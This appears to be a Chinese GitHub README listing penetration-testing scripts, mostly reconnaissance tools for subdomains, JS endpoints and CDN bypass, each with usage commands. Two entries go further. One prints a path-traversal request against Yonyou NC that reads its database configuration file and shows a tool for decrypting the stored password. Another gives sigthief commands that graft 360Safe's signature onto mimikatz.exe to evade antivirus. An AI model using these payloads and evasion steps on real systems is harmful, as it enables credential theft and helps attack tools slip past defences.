# script-collect
收集一些不错的脚本，后面用来缝合怪

目前已收集脚本
1. Bypass_cdn （一款bypass cdn工具）

use eg:

```python3 .\scan.py https://www.ghxi.com/```

![image](https://user-images.githubusercontent.com/37091232/195241543-9e753462-1b0a-43da-9616-39cd93b48ef0.png)


2. JSINFO-SCAN（JS信息搜集）

github地址：https://github.com/p1g3/JSINFO-SCAN

```python3 jsinfo.py -d jd.com --keyword jd --save jd.api.txt --savedomain jd.domain.txt```


（⭐）3. leakinfo_finder

自动爬取JS文件中接口，拼接接口，加入常见springboot等目录，进行http请求（get+post），正则匹配响应结果，输出敏感信息

github地址：https://github.com/Carrypan2022/leakinfo_finder

![image](https://user-images.githubusercontent.com/37091232/195039111-39f66975-09e8-4555-ae54-90a43f6fcad2.png)

希望增加：① url的响应状态码（js会有很多死链） ② 增加js中的正则匹配，以及提取接口的规则导出

4. py3zoomeye_subdomainapi

zoomeye钟馗之眼子域名查询api脚本，版本v2.0

github地址：https://github.com/moyuwa/zoomeye-subdomianapi

![image](https://user-images.githubusercontent.com/37091232/195241489-818ec188-26b7-4c32-aa14-ba718af3f2d8.png)

5. 01-ncDatabase

用友nc数据库密码解密

```
╰─$ java -jar 01-ncDatabase.jar
[*] 用友nc 数据库密码解密:
[*] 数据库配置文件: /NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
[*] Example: jlehfdffcfmohiag

[+] 请输入加密的数据库密文= jlehfdffcfmohiag
>>> 数据库明文密码= 1

[+] 请输入加密的数据库密文=
```

6. p2domain_v0.2.zip

ip2domain - 批量查询ip对应域名、备案信息、百度权重

github地址：https://github.com/Sma11New/ip2domain

![image](https://user-images.githubusercontent.com/37091232/198302360-7ed6f52e-9a3a-42ae-8d26-be677f7e4221.png)

7. sigthief.py

EXE签名窃取，可以给一个没有签名的exe添加一个签名，能够略微提升一些免杀效果

Usage: sigthief.py [options]

```
Options:
  -h, --help            show this help message and exit（查看帮助）
  -i FILE, --file=FILE  input file（签名来源文件）
  -r, --rip             rip signature off inputfile（从签名来源文件中删除签名）
  -a, --add             add signautre to targetfile（）
  -o OUTPUTFILE, --output=OUTPUTFILE
                        output file
  -s SIGFILE, --sig=SIGFILE
                        binary signature from disk
  -t TARGETFILE, --target=TARGETFILE
                        file to append signature too
  -c, --checksig        file to check if signed; does not verify signature
  -T, --truncate        truncate signature (i.e. remove sig)
```
从exeA获取签名并添加给exeB 
 ```
 python sigthief.py -i 360Safe.exe -t mimikatz.exe -o 1.exe
 ```
 ![image](https://user-images.githubusercontent.com/37091232/200159217-2ddfa347-bb6f-441f-b7aa-d45efa45398f.png)

保存签名
```
python sigthief.py -i 360Safe.exe -r
```
使用保存的签名
```
python sigthief.py -s 360Safe.exe_sig -t 2.exe
```
删除签名
```
python sigthief.py -i 2.exe -T
```
检查是否有签名（不检查有效性）
```
python sigthief.py -i 2.exe -c
```

8. Webpackfind

Webpackfind-信息收集工具

github地址：https://github.com/xz-zone/Webpackfind

![image](https://user-images.githubusercontent.com/37091232/200601302-efd6a2f4-e27b-4532-b465-87a748eec183.png)


9. cero

通过证书反查域名

github地址：https://github.com/glebarez/cero

![image](https://user-images.githubusercontent.com/37091232/200862677-c3bbbe9d-478f-4e82-a716-9f476631044b.png)

